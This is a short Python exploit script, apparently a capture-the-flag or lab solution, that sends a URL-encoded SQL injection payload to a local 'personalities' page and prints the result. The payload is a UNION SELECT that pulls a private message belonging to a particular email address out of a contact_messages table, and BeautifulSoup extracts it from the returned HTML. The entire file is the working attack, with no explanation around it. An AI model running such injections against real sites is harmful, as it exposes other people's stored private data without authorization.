from bs4 import BeautifulSoup
import requests


def main():
    result = requests.get("http://127.0.0.1/personalities?id=999%27%20UNION%20SELECT%20mail,%20message%20FROM%20contact_messages%20WHERE%20mail=%27james@bond.mi5")
    c = result.content
    soup = BeautifulSoup(c)
    a = soup.find("a", {"class": "list-group-item"})
    msg = a.text.split(":")[1]
    print(msg)


if __name__ == '__main__':
    main()
